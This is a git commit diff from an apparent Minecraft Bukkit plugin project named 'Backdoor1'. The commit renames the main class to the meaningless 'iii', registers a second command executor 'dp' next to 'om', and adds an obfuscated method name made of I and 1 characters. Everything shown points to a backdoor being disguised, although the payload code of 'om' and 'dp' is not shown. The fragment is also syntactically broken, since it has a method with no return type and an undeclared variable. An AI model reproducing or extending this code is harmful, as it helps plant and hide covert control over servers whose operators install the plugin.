d6badba55db6f0d87e7aa1cd1a8abb6d8156e6ec
Torono909 <86355565+Torono909@users.noreply.github.com>
2022-02-03 11:45:35 +0530

    Update and rename Backdoor1.java to iii.java

--- Backdoor1/src/main/java/me/lunacore/backdoor1/iii.java
+++ Backdoor1/src/main/java/me/lunacore/backdoor1/iii.java
@@ -3,10 +3,11 @@ package me.lunacore.backdoor1;
 import me.lunacore.commands.om;
 import org.bukkit.plugin.java.JavaPlugin;
 
-public final class Backdoor1 extends JavaPlugin {
+public final class iii extends JavaPlugin {
     @Override
     public void onEnable() {
         this.getCommand("om").setExecutor(new om());
+        this.getCommand("dp").setExecutor(new dp());
     }
     protected IIIIIIIIIIII1I1I1IIIIIIIIIII1II1I1IIIIIIII1I1I1I1I11IIIIIIIII1I1IIIIIIIIIIIIIIIIIII1I1I1I1(){
         Player p = (Player) sender;
